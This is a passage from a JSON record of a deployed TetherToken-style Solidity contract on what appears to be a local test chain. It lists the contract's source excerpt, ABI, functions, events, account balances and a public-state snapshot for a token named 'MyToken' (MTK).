approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides 